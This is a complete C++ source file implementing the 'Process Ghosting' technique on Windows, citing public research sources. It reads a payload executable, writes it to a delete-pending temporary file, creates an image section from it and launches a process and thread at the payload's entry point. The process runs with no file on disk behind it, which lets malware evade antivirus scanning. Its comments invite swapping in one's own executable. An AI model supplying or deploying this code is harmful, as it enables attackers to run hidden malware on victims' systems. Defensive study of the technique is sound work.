/*
Title: Process Ghosting
Resources:
	- https://www.elastic.co/jp/blog/process-ghosting-a-new-executable-image-tampering-attack
	- https://github.com/hasherezade/process_ghosting
	- https://unprotect.it/technique/process-ghosting/
*/

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string>
#include <atlconv.h>
#include <UserEnv.h>
#include "ProcessGhosting.hpp"
#pragma comment(lib, "Userenv.lib")

_NtCreateProcessEx ntCreateProcessEx = nullptr;
_NtCreateSection ntCreateSection = nullptr;
_NtCreateThreadEx ntCreateThreadEx = nullptr;
_NtQueryInformationProcess ntQueryInformationProcess = nullptr;
_NtSetInformationFile ntSetInformationFile = nullptr;
_RtlCreateProcessParametersEx rtlCreateProcessParametersEx = nullptr;

VOID FreeAll(
	HMODULE hNtdll,
	HANDLE hPayloadFile,
	char* payloadBuf,
	HANDLE hTargetFile,
	HANDLE hSection,
	HANDLE hProcess,
	HANDLE hThread
) {
	if (hNtdll)
		FreeLibrary(hNtdll);
	if (hPayloadFile)
		CloseHandle(hPayloadFile);
	if (payloadBuf)
		delete[] payloadBuf;
	payloadBuf = nullptr;
	if (hTargetFile)
		CloseHandle(hTargetFile);
	if (hSection)
		CloseHandle(hSection);
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
}

BOOL InitFunctions(HMODULE hNtdll) {
	ntCreateProcessEx = reinterpret_cast<_NtCreateProcessEx>(GetProcAddress(hNtdll, "NtCreateProcessEx"));
	if (!ntCreateProcessEx)
		return FALSE;
	ntCreateSection = reinterpret_cast<_NtCreateSection>(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!ntCreateSection)
		return FALSE;
	ntCreateThreadEx = reinterpret_cast<_NtCreateThreadEx>(GetProcAddress(hNtdll, "NtCreateThreadEx"));
	if (!ntCreateThreadEx)
		return FALSE;
	ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess)
		return FALSE;
	ntSetInformationFile = reinterpret_cast<_NtSetInformationFile>(GetProcAddress(hNtdll, "NtSetInformationFile"));
	if (!ntSetInformationFile)
		return FALSE;
	rtlCreateProcessParametersEx = reinterpret_cast<_RtlCreateProcessParametersEx>(GetProcAddress(hNtdll, "RtlCreateProcessParametersEx"));
	if (!rtlCreateProcessParametersEx)
		return FALSE;

	return TRUE;
}

std::wstring Str2Wstr(const std::string& str) {
	USES_CONVERSION;
	return A2W(str.c_str());
}

std::string Wstr2Str(const std::wstring& wStr) {
	USES_CONVERSION;
	return W2A(wStr.c_str());
}

const BOOL GetProcessPeb(HANDLE hProcess, PEB_T &peb, PROCESS_BASIC_INFORMATION &pbi) {
	HANDLE hDup = nullptr;
	NTSTATUS status;

	if (!DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
		return FALSE;
	}

	DWORD dwReturnLength = 0;
	status = ntQueryInformationProcess(
		hDup,
		ProcessBasicInformation,
		(PVOID) & pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
	);
	if (!BCRYPT_SUCCESS(status)) {
		CloseHandle(hDup);
		return FALSE;
	}

	if (!ReadProcessMemory(hDup, pbi.PebBaseAddress, &peb, sizeof(PEB_T), 0)) {
		CloseHandle(hDup);
		return FALSE;
	}

	CloseHandle(hDup);

	return TRUE;
}

const ULONGLONG GetEntryPointRVA(PCHAR &pFileImage) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileImage;
#ifdef _WIN64
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pDosHeader + pDosHeader->e_lfanew);
#else
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG)pDosHeader + pDosHeader->e_lfanew);
#endif

	if (pNtHeaders)
		return pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	else
		return 0;
}

LPVOID WriteParamsProcess(const HANDLE hProcess, const PRTL_USER_PROCESS_PARAMETERS_T& params, DWORD dwProtect) {
	PVOID buffer = params;
	ULONG_PTR bufferEnd = (ULONG_PTR)params + params->Length;

	// params and environement in one space
	if (params->Environment) {
		if ((ULONG_PTR)params > (ULONG_PTR)params->Environment)
			buffer = (PVOID)params->Environment;
		ULONG_PTR envEnd = (ULONG_PTR)params->Environment + params->EnvironmentSize;
		if (envEnd > bufferEnd)
			bufferEnd = envEnd;
	}

	// Copy the continuous area containing parameters + environment.
	SIZE_T bufferSize = bufferEnd - (ULONG_PTR)buffer;
	if (VirtualAllocEx(hProcess, buffer, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, nullptr)) {
			return nullptr;
		}
		if (params->Environment) {
			if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, nullptr)) {
				return nullptr;
			}
		}

		return (LPVOID)params;
	}

	// Could not copy the continuous space, try to fill it as separate chunks
	if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
		return FALSE;
	if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, nullptr))
		return FALSE;
	if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, nullptr))
		return FALSE;
	if (params->Environment) {
		if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
			return nullptr;
		if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, nullptr))
			return nullptr;
	}

	return (LPVOID)params;
}

const BOOL SetProcessParameter(const HANDLE &hProcess, LPCSTR tempPath, const ULONGLONG uPebBaseAddr) {
	std::string sTempPath(tempPath);
	std::wstring wTempPath = Str2Wstr(sTempPath).c_str();

	UNICODE_STRING uTempPath = { 0 };
	RtlInitUnicodeString(&uTempPath, wTempPath.c_str());

	std::wstring::size_type wStrType = wTempPath.find_last_of('\\');
	if (wStrType == std::wstring::npos)
		return FALSE;

	std::wstring wTempCurrentDir = wTempPath.substr(0, wStrType);
	if (wTempCurrentDir.empty())
		return FALSE;

	UNICODE_STRING uTempCurrentDir = { 0 };
	RtlInitUnicodeString(&uTempCurrentDir, wTempCurrentDir.c_str());

	const WCHAR dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, dllDir);

	UNICODE_STRING uWindowName = { 0 };
	const WCHAR* windowName = (LPWSTR)L"360";
	RtlInitUnicodeString(&uWindowName, windowName);

	LPVOID environment;
	if (!CreateEnvironmentBlock(&environment, nullptr, TRUE)) {
		return FALSE;
	}

	PRTL_USER_PROCESS_PARAMETERS_T params = nullptr;
	NTSTATUS status = rtlCreateProcessParametersEx(
		(PRTL_USER_PROCESS_PARAMETERS*)&params,
		(PUNICODE_STRING)&uTempPath,
		(PUNICODE_STRING)&uDllDir,
		(PUNICODE_STRING)&uTempCurrentDir,
		(PUNICODE_STRING)&uTempPath,
		environment,
		(PUNICODE_STRING)&uWindowName,
		nullptr,
		nullptr,
		nullptr,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);
	if (!NT_SUCCESS(status))
		return FALSE;

	LPVOID lpRemoteParams = WriteParamsProcess(hProcess, params, PAGE_READWRITE);
	if (!lpRemoteParams)
		return FALSE;

	// Set params in PEB
	ULONGLONG uRemotePebAddr = uPebBaseAddr;
	if (!uRemotePebAddr)
		return FALSE;

	PEB_T pebCopied = { 0 };
	ULONGLONG uOffset = (ULONGLONG)&pebCopied.ProcessParameters - (ULONGLONG)&pebCopied;

	LPVOID lpRemoteImageBase = (LPVOID)(uRemotePebAddr + uOffset);

	SIZE_T dwWritten = 0;
	if (!WriteProcessMemory(hProcess, lpRemoteImageBase, &lpRemoteParams, sizeof(PVOID), &dwWritten)) {
		return FALSE;
	}

	return TRUE;
}

BOOL ProcessGhosting() {
	LPCSTR payloadPath = "C:\\evil.exe"; // Replace it with your own executable file to inject.
	LPCSTR tempPath = "C:\\temp.exe"; // Replace it with temporary executable file which does not exist on the system.

	NTSTATUS status;

	HMODULE hNtdll = (HMODULE)LoadLibraryA("ntdll.dll");
	if (!hNtdll) return FALSE;
	if (!InitFunctions(hNtdll)) return FALSE;

	// Read payload buffer.
	HANDLE hPayloadFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!hPayloadFile || hPayloadFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	DWORD dwPayloadSize = GetFileSize(hPayloadFile, &dwPayloadSize);
	char* payloadBuf = new char[dwPayloadSize + 1];
	if (!payloadBuf) {
		FreeAll(hNtdll, hPayloadFile, payloadBuf, nullptr, nullptr, nullptr, nullptr);
		return FALSE;
	}
	RtlSecureZeroMemory(payloadBuf, dwPayloadSize + 1);
	if (!ReadFile(hPayloadFile, payloadBuf, dwPayloadSize, &dwPayloadSize, nullptr)) {
		FreeAll(hNtdll, hPayloadFile, payloadBuf, nullptr, nullptr, nullptr, nullptr);
		return FALSE;
	}

	CloseHandle(hPayloadFile);

	// Create new temporary file.
	HANDLE hTempFile = CreateFileA(
		tempPath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE,
		nullptr
	);
	if (!hTempFile || hTempFile == INVALID_HANDLE_VALUE) {
		FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, nullptr, nullptr, nullptr);
		return FALSE;
	}

	HANDLE hSection = nullptr;
	HANDLE hProcess = nullptr;
	HANDLE hThread = nullptr;

	// Set Delete attribute on Close FILE_FLAG_DELETE_ON_CLOSE
	IO_STATUS_BLOCK isb = { 0 };
	FILE_DISPOSITION_INFO fdi = { 0 };
	fdi.DeleteFile = TRUE;
	status = ntSetInformationFile(
		hTempFile,
		&isb,
		&fdi,
		sizeof(fdi),
		(FILE_INFORMATION_CLASS)13 // FileDispositionInformation
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, hSection, hProcess, hThread);
		return FALSE;
	}

	// Write the payload data to the temporary file.
	DWORD dwBytesWritten = 0;
	OVERLAPPED ol = { 0 };
	if (!WriteFile(hTempFile, payloadBuf, dwPayloadSize, &dwBytesWritten, &ol)) {
		if (GetLastError() == ERROR_IO_PENDING) {
			// Wait for the completion.
			if (!GetOverlappedResult(hTempFile, &ol, &dwBytesWritten, TRUE)) {
				FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, hSection, hProcess, hThread);
				return FALSE;
			}
		} else {
			FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, hSection, hProcess, hThread);
			return FALSE;
		}
	}
    // Write immediately because the temp file will be executed within this (ProcessGhosting's) process.
	if (!FlushFileBuffers(hTempFile)) {
		FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, hSection, hProcess, hThread);
		return FALSE;
	}

	// Create section
	status = ntCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		nullptr,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hTempFile
	);
	if (!NT_SUCCESS(status) || !hSection) {
		FreeAll(hNtdll, nullptr, payloadBuf, hTempFile, hSection, hProcess, hThread);
		return FALSE;
	}

	CloseHandle(hTempFile);

	// Create new process
	status = ntCreateProcessEx(
		&hProcess,
		PROCESS_ALL_ACCESS,
		nullptr,
		GetCurrentProcess(),
		PS_INHERIT_HANDLES,
		hSection,
		nullptr,
		nullptr,
		FALSE
	);
	if (!NT_SUCCESS(status) || !hProcess) {
		FreeAll(hNtdll, nullptr, payloadBuf, nullptr, hSection, hProcess, hThread);
		return FALSE;
	}

	// Get PEB image base address
	PEB_T peb = { 0 };
	PROCESS_BASIC_INFORMATION pbi = { 0, };
	if (!GetProcessPeb(hProcess, peb, pbi)) {
		FreeAll(hNtdll, nullptr, payloadBuf, nullptr, hSection, hProcess, hThread);
		return FALSE;
	}
	ULONGLONG uImageBaseAddr = (ULONGLONG)peb.ImageBaseAddress;

	// Get file OEP
	ULONGLONG uEntryPoint = 0;
	const ULONGLONG uPayloadEp = GetEntryPointRVA(payloadBuf);
	if (uPayloadEp) {
		uEntryPoint = uImageBaseAddr + uPayloadEp;
	}

	// Set process parameter
	if (!SetProcessParameter(hProcess, tempPath, (ULONGLONG)pbi.PebBaseAddress)) {
		FreeAll(hNtdll, nullptr, payloadBuf, nullptr, hSection, hProcess, hThread);
		return FALSE;
	}

	// CreateThread ImageBase
	status = ntCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		(LPTHREAD_START_ROUTINE)uEntryPoint,
		nullptr,
		FALSE,
		0,
		0,
		0,
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, payloadBuf, nullptr, hSection, hProcess, hThread);
		return FALSE;
	}

	FreeAll(hNtdll, nullptr, payloadBuf, nullptr, hSection, hProcess, hThread);

	return TRUE;
}
